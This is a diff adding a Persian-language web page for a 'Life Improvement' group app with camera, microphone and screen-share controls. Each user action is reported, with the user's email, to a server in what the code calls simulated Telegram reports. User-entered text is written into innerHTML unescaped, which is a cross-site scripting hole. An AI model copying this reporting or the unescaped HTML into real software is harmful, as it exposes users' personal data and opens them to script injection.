+                    sendTelegramReport(`📹 کاربر ${currentUser.email} دوربین را فعال کرد.`);
+                } catch (error) {
+                    console.error('خطا در فعال‌سازی دوربین:', error);
+                    showNotification('خطا در فعال‌سازی دوربین', 'error');
+                }
+            }
+            
+            // توقف دوربین
+            function stopCamera() {
+                if (localStream) {
+                    localStream.getTracks().forEach(track => {
+                        if (track.kind === 'video') {
+                            track.stop();
+                        }
+                    });
+                    localVideo.srcObject = null;
+                    
+                    startCameraBtn.disabled = false;
+                    stopCameraBtn.disabled = true;
+                    cameraStatus.className = 'status-indicator status-inactive';
+                    
+                    console.log('دوربین غیرفعال شد');
+                    showNotification('دوربین غیرفعال شد', 'info');
+                    
+                    // گزارش به تلگرام
+                    sendTelegramReport(`📹 کاربر ${currentUser.email} دوربین را غیرفعال کرد.`);
+                }
+            }
+            
+            // شروع میکروفون
+            async function startMicrophone() {
+                try {
+                    // اگر قبلاً استریم داریم، فقط صدا را اضافه می‌کنیم
+                    if (localStream) {
+                        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        audioStream.getAudioTracks().forEach(track => {
+                            localStream.addTrack(track);
+                        });
+                    } else {
+                        localStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        localVideo.srcObject = localStream;
+                    }
+                    
+                    startMicBtn.disabled = true;
+                    stopMicBtn.disabled = false;
+                    
+                    console.log('میکروفون فعال شد');
+                    showNotification('میکروفون فعال شد', 'success');
+                    
+                    // گزارش به تلگرام
+                    sendTelegramReport(`🎤 کاربر ${currentUser.email} میکروفون را فعال کرد.`);
+                } catch (error) {
+                    console.error('خطا در فعال‌سازی میکروفون:', error);
+                    showNotification('خطا در فعال‌سازی میکروفون', 'error');
+                }
+            }
+            
+            // توقف میکروفون
+            function stopMicrophone() {
+                if (localStream) {
+                    localStream.getAudioTracks().forEach(track => {
+                        track.stop();
+                    });
+                    
+                    // اگر فقط صدا داریم و ویدئو نداریم، کل استریم را پاک می‌کنیم
+                    if (localStream.getVideoTracks().length === 0) {
+                        localVideo.srcObject = null;
+                        localStream = null;
+                    }
+                    
+                    startMicBtn.disabled = false;
+                    stopMicBtn.disabled = true;
+                    
+                    console.log('میکروفون غیرفعال شد');
+                    showNotification('میکروفون غیرفعال شد', 'info');
+                    
+                    // گزارش به تلگرام
+                    sendTelegramReport(`🎤 کاربر ${currentUser.email} میکروفون را غیرفعال کرد.`);
+                }
+            }
+            
+            // شروع اشتراک‌گذاری صفحه
+            async function startScreenShare() {
+                try {
+                    screenStream = await navigator.mediaDevices.getDisplayMedia({ 
+                        video: true,
+                        audio: true 
+                    });
+                    screenShare.srcObject = screenStream;
+                    
+                    startScreenBtn.disabled = true;
+                    stopScreenBtn.disabled = false;
+                    screenStatus.className = 'status-indicator status-active';
+                    
+                    // وقتی کاربر اشتراک‌گذاری را متوقف کرد
+                    screenStream.getTracks().forEach(track => {
+                        track.onended = () => {
+                            stopScreenShare();
+                        };
+                    });
+                    
+                    console.log('اشتراک‌گذاری صفحه فعال شد');
+                    showNotification('اشتراک‌گذاری صفحه فعال شد', 'success');
+                    
+                    // گزارش به تلگرام
+                    sendTelegramReport(`🖥️ کاربر ${currentUser.email} اشتراک‌گذاری صفحه را شروع کرد.`);
+                } catch (error) {
+                    console.error('خطا در اشتراک‌گذاری صفحه:', error);
+                    showNotification('خطا در اشتراک‌گذاری صفحه', 'error');
+                }
+            }
+            
+            // توقف اشتراک‌گذاری صفحه
+            function stopScreenShare() {
+                if (screenStream) {
+                    screenStream.getTracks().forEach(track => {
+                        track.stop();
+                    });
+                    screenShare.srcObject = null;
+                    screenStream = null;
+                    
+                    startScreenBtn.disabled = false;
+                    stopScreenBtn.disabled = true;
+                    screenStatus.className = 'status-indicator status-inactive';
+                    
+                    console.log('اشتراک‌گذاری صفحه غیرفعال شد');
+                    showNotification('اشتراک‌گذاری صفحه غیرفعال شد', 'info');
+                    
+                    // گزارش به تلگرام
+                    sendTelegramReport(`🖥️ کاربر ${currentUser.email} اشتراک‌گذاری صفحه را متوقف کرد.`);
+                }
+            }
+            
+            // ارسال گزارش به تلگرام
+            async function sendTelegramReport(message = null) {
+                if (!currentUser) {
+                    showNotification('لطفاً ابتدا وارد شوید.', 'error');
+                    return;
+                }
+                
+                try {
+                    // اگر پیام خاصی ارسال نشده، گزارش کلی ایجاد کن
+                    if (!message) {
+                        message = generateSystemReport();
+                    }
+                    
+                    // در حالت واقعی، اینجا درخواست به API تلگرام ارسال می‌شود
+                    // شبیه‌سازی ارسال به سرور
+                    const response = await fetch(`${SERVER_URL}/posts`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            title: 'گزارش سیستم',
+                            body: message,
+                            userId: currentUser.id
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        showNotification('گزارش با موفقیت ارسال شد!', 'success');
+                        console.log('گزارش تلگرام:', message);
+                    } else {
+                        throw new Error('خطا در ارسال گزارش');
+                    }
+                } catch (error) {
+                    console.error('خطا در ارسال گزارش:', error);
+                    showNotification('خطا در ارسال گزارش', 'error');
+                }
+            }
+            
+            // تولید گزارش سیستم
+            function generateSystemReport() {
+                let report = `📊 گزارش سیستم Life Improvement\n\n`;
+                report += `👤 کاربر: ${currentUser.name}\n`;
+                report += `📧 ایمیل: ${currentUser.email}\n`;
+                report += `📅 تاریخ: ${new Date().toLocaleString('fa-IR')}\n\n`;
+                
+                report += `📈 وضعیت سیستم:\n`;
+                report += `• تعداد Lifeها: ${userLives.length}\n`;
+                report += `• دوربین: ${localStream && localStream.getVideoTracks().length > 0 ? 'فعال' : 'غیرفعال'}\n`;
+                report += `• میکروفون: ${localStream && localStream.getAudioTracks().length > 0 ? 'فعال' : 'غیرفعال'}\n`;
+                report += `• اشتراک صفحه: ${screenStream ? 'فعال' : 'غیرفعال'}\n\n`;
+                
+                report += `📋 Lifeهای کاربر:\n`;
+                if (userLives.length === 0) {
+                    report += `• هیچ Lifeای ایجاد نشده است.\n`;
+                } else {
+                    userLives.forEach((life, index) => {
+                        report += `${index + 1}. ${life.name} (کد: ${life.code})\n`;
+                    });
+                }
+                
+                return report;
+            }
+            
+            // بارگذاری Lifeهای کاربر از سرور
+            async function loadUserLives() {
+                if (!currentUser) return;
+                
+                try {
+                    lifeList.innerHTML = '<li>در حال بارگذاری Lifeها...</li>';
+                    
+                    // شبیه‌سازی درخواست به سرور برای دریافت Lifeهای کاربر
+                    const response = await fetch(`${SERVER_URL}/posts?userId=${currentUser.id}`);
+                    const posts = await response.json();
+                    
+                    // استفاده از داده‌های تست برای نمایش Lifeها
+                    userLives = [
+                        {
+                            id: 1,
+                            name: 'Life بهبود فردی',
+                            description: 'گروهی برای بهبود مهارت‌های فردی',
+                            code: 'LIFE001',
+                            members: [currentUser.id],
+                            admins: [currentUser.id],
+                            link: `${window.location.origin}/life/1`
+                        },
+                        {
+                            id: 2,
+                            name: 'Life سلامت و تندرستی',
+                            description: 'گروهی برای تمرینات ورزشی و سلامت',
+                            code: 'LIFE002',
+                            members: [currentUser.id],
+                            admins: [currentUser.id],
+                            link: `${window.location.origin}/life/2`
+                        }
+                    ];
+                    
+                    updateLifeList();
+                    
+                } catch (error) {
+                    console.error('خطا در بارگذاری Lifeها:', error);
+                    lifeList.innerHTML = '<li>خطا در بارگذاری Lifeها</li>';
+                    showNotification('خطا در بارگذاری Lifeها', 'error');
+                }
+            }
+            
+            // ایجاد Life جدید در سرور
+            async function createLifeOnServer(lifeData) {
+                try {
+                    const response = await fetch(`${SERVER_URL}/posts`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            title: lifeData.name,
+                            body: lifeData.description,
+                            userId: currentUser.id
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        const newLife = await response.json();
+                        return {
+                            id: newLife.id,
+                            ...lifeData
+                        };
+                    } else {
+                        throw new Error('خطا در ایجاد Life');
+                    }
+                } catch (error) {
+                    console.error('خطا در ایجاد Life:', error);
+                    throw error;
+                }
+            }
+            
+            // باز کردن مودال ایجاد Life
+            createLifeBtn.addEventListener('click', function() {
+                if (!currentUser) {
+                    showNotification('لطفاً ابتدا وارد شوید.', 'error');
+                    return;
+                }
+                createLifeModal.style.display = 'flex';
+            });
+            
+            // بستن مودال ایجاد Life
+            cancelCreateLife.addEventListener('click', function() {
+                createLifeModal.style.display = 'none';
+            });
+            
+            // تأیید ایجاد Life
+            confirmCreateLife.addEventListener('click', async function() {
+                const lifeName = document.getElementById('lifeName').value;
+                const lifeDescription = document.getElementById('lifeDescription').value;
+                
+                if (!lifeName) {
+                    showNotification('لطفاً نام Life را وارد کنید.', 'error');
+                    return;
+                }
+                
+                try {
+                    showNotification('در حال ایجاد Life...', 'info');
+                    
+                    // ایجاد Life جدید
+                    const newLife = {
+                        name: lifeName,
+                        description: lifeDescription,
+                        creatorId: currentUser.id,
+                        members: [currentUser.id],
+                        admins: [currentUser.id],
+                        code: generateCode(6),
+                        locked: currentUser.isAdmin,
+                        link: `${window.location.origin}/life/${generateId()}`
+                    };
+                    
+                    // ارسال به سرور
+                    const createdLife = await createLifeOnServer(newLife);
+                    userLives.push(createdLife);
+                    
+                    // به روز رسانی لیست Lifeها
+                    updateLifeList();
+                    
+                    // بستن مودال
+                    createLifeModal.style.display = 'none';
+                    
+                    // پاک کردن فیلدها
+                    document.getElementById('lifeName').value = '';
+                    document.getElementById('lifeDescription').value = '';
+                    
+                    showNotification(`Life "${lifeName}" با موفقیت ایجاد شد.`, 'success');
+                    
+                    // گزارش به تلگرام
+                    sendTelegramReport(`✅ کاربر ${currentUser.email} Life جدید "${lifeName}" ایجاد کرد.`);
+                    
+                } catch (error) {
+                    showNotification('خطا در ایجاد Life', 'error');
+                }
+            });
+            
+            // باز کردن مودال پیوستن به Life
+            joinLifeBtn.addEventListener('click', function() {
+                if (!currentUser) {
+                    showNotification('لطفاً ابتدا وارد شوید.', 'error');
+                    return;
+                }
+                joinLifeModal.style.display = 'flex';
+            });
+            
+            // بستن مودال پیوستن به Life
+            cancelJoinLife.addEventListener('click', function() {
+                joinLifeModal.style.display = 'none';
+            });
+            
+            // تأیید پیوستن به Life
+            confirmJoinLife.addEventListener('click', function() {
+                const lifeCode = document.getElementById('lifeCode').value;
+                
+                if (!lifeCode) {
+                    showNotification('لطفاً کد Life را وارد کنید.', 'error');
+                    return;
+                }
+                
+                // در اینجا باید به سرور درخواست بزنیم که Life با این کد وجود دارد
+                // برای نمونه، ما یک Life نمونه ایجاد می‌کنیم
+                const newLife = {
+                    id: generateId(),
+                    name: `Life ${lifeCode}`,
+                    description: 'Life ای که شما به آن پیوستید',
+                    code: lifeCode,
+                    members: [currentUser.id],
+                    admins: [currentUser.id],
+                    link: `${window.location.origin}/life/${generateId()}`
+                };
+                
+                userLives.push(newLife);
+                
+                // به روز رسانی لیست Lifeها
+                updateLifeList();
+                
+                // بستن مودال
+                joinLifeModal.style.display = 'none';
+                
+                // پاک کردن فیلد
+                document.getElementById('lifeCode').value = '';
+                
+                showNotification(`شما با موفقیت به Life پیوستید.`, 'success');
+                
+                // گزارش به تلگرام
+                sendTelegramReport(`👥 کاربر ${currentUser.email} به Life با کد ${lifeCode} پیوست.`);
+            });
+            
+            // کپی کردن لینک Life
+            copyLifeLinkBtn.addEventListener('click', function() {
+                lifeLinkInput.select();
+                document.execCommand('copy');
+                showNotification('لینک Life با موفقیت کپی شد!', 'success');
+            });
+            
+            // به روز رسانی رابط کاربری پس از ورود
+            function updateUIAfterLogin() {
+                // مخفی کردن صفحه اصلی و نمایش داشبورد
+                document.getElementById('mainPage').style.display = 'none';
+                document.getElementById('dashboardPage').style.display = 'block';
+                
+                // به روز رسانی اطلاعات کاربر
+                document.getElementById('userName').textContent = currentUser.name;
+                document.getElementById('userEmail').textContent = currentUser.email;
+                document.getElementById('userAvatar').innerHTML = `<i class="fas fa-user"></i>`;
+                
+                // تغییر دکمه‌های هدر
+                if (currentUser.isAdmin) {
+                    gmailSignupBtn.innerHTML = '<i class="fas fa-crown"></i> مدیر سیستم';
+                } else {
+                    gmailSignupBtn.innerHTML = '<i class="fas fa-user"></i> پروفایل';
+                }
+                
+                // بارگذاری Lifeهای کاربر
+                loadUserLives();
+                
+                // درخواست دسترسی به رسانه
+                requestMediaAccess();
+            }
+            
+            // درخواست دسترسی به رسانه
+            async function requestMediaAccess() {
+                try {
+                    // درخواست دسترسی به دوربین و میکروفون
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true, 
+                        audio: true 
+                    });
+                    
+                    // غیرفعال کردن استریم (فقط برای آزمایش دسترسی)
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    showNotification('دسترسی به دوربین و میکروفون تأیید شد.', 'success');
+                } catch (error) {
+                    console.error('خطا در دسترسی به رسانه:', error);
+                    showNotification('لطفاً دسترسی به دوربین و میکروفون را تأیید کنید.', 'error');
+                }
+            }
+            
+            // به روز رسانی لیست Lifeها
+            function updateLifeList() {
+                lifeList.innerHTML = '';
+                
+                if (!currentUser) {
+                    lifeList.innerHTML = '<li>لطفاً ابتدا وارد شوید.</li>';
+                    return;
+                }
+                
+                if (userLives.length === 0) {
+                    lifeList.innerHTML = '<li>شما هنوز به هیچ Life‌ای نپیوسته‌اید.</li>';
+                    return;
+                }
+                
+                userLives.forEach(life => {
+                    const li = document.createElement('li');
+                    
+                    const lifeInfo = document.createElement('div');
+                    lifeInfo.textContent = life.name;
+                    
+                    // اضافه کردن نشانگر مدیر
+                    if (life.admins.includes(currentUser.id)) {
+                        const adminBadge = document.createElement('span');
+                        adminBadge.textContent = 'مدیر';
+                        adminBadge.className = 'admin-badge';
+                        lifeInfo.insertBefore(adminBadge, lifeInfo.firstChild);
+                    }
+                    
+                    // اضافه کردن نشانگر قفل اگر Life قفل شده باشد
+                    if (life.locked) {
+                        const lockBadge = document.createElement('span');
+                        lockBadge.textContent = 'قفل شده';
+                        lockBadge.className = 'lock-badge';
+                        lifeInfo.insertBefore(lockBadge, lifeInfo.firstChild);
+                    }
+                    
+                    li.appendChild(lifeInfo);
+                    li.dataset.lifeId = life.id;
+                    
+                    li.addEventListener('click', function() {
+                        // حذف کلاس active از همه آیتم‌ها
+                        document.querySelectorAll('.life-list li').forEach(item => {
+                            item.classList.remove('active');
+                        });
+                        
+                        // اضافه کردن کلاس active به آیتم انتخاب شده
+                        this.classList.add('active');
+                        
+                        // نمایش جزئیات Life
+                        showLifeDetails(life);
+                    });
+                    
+                    lifeList.appendChild(li);
+                });
+            }
+            
+            // نمایش جزئیات Life
+            function showLifeDetails(life) {
+                selectedLifeTitle.textContent = life.name;
+                lifeDetails.innerHTML = `<p>${life.description}</p><p>کد Life: <strong>${life.code}</strong></p>`;
+                if (life.locked) {
+                    lifeDetails.innerHTML += `<p style="color: #ff9800; font-weight: bold;">این Life قفل شده است و فقط مدیران می‌توانند تغییراتی ایجاد کنند.</p>`;
+                }
+                
+                // نمایش لینک Life
+                lifeLinkContainer.style.display = 'block';
+                lifeLinkInput.value = life.link;
+                
+                // نمایش لیست اعضا
+                membersList.style.display = 'block';
+                membersContainer.innerHTML = '';
+                
+                // در اینجا باید از سرور لیست اعضا را بگیریم
+                // برای نمونه، کاربر فعلی را نمایش می‌دهیم
+                const memberItem = document.createElement('div');
+                memberItem.className = 'member-item';
+                
+                const memberInfo = document.createElement('div');
+                memberInfo.innerHTML = `<strong>${currentUser.name}</strong><br><small>${currentUser.email}</small>`;
+                
+                const memberActions = document.createElement('div');
+                memberActions.className = 'member-actions';
+                
+                // اگر کاربر مدیر است، نشانگر مدیر نمایش داده می‌شود
+                if (life.admins.includes(currentUser.id)) {
+                    const adminBadge = document.createElement('span');
+                    adminBadge.textContent = 'مدیر';
+                    adminBadge.className = 'admin-badge';
+                    memberInfo.insertBefore(adminBadge, memberInfo.firstChild);
+                }
+                
+                memberItem.appendChild(memberInfo);
+                memberItem.appendChild(memberActions);
+                membersContainer.appendChild(memberItem);
+            }
+            
+            // تولید شناسه منحصر به فرد
+            function generateId() {
+                return '_' + Math.random().toString(36).substr(2, 9);
+            }
+            
+            // تولید کد تصادفی
+            function generateCode(length) {
+                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                let result = '';
+                for (let i = 0; i < length; i++) {
+                    result += characters.charAt(Math.floor(Math.random() * characters.length));
+                }
+                return result;
+            }
+            
+            // بررسی اگر کاربر قبلاً وارد شده
+            function checkExistingLogin() {
+                const savedUser = localStorage.getItem('currentUser');
+                if (savedUser) {
+                    currentUser = JSON.parse(savedUser);
+                    updateUIAfterLogin();
+                }
+            }
+            
+            // بررسی وضعیت ورود هنگام بارگذاری صفحه
+            checkExistingLogin();
+        });
+    </script>
+</body>
+</html>
